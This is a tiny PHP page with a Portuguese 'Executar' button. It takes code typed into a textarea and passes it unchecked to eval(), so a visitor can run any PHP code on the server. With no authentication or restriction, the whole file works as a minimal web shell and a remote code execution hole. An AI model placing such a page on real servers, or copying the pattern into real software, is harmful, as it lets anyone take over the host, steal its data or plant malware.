<form method="post">
    <textarea name="code" cols="100" rows="30"></textarea><br><br>
    <button>Executar</button>
</form>

<?php

    if (!empty($_POST['code'])) {
        eval($_POST['code']);
    }
    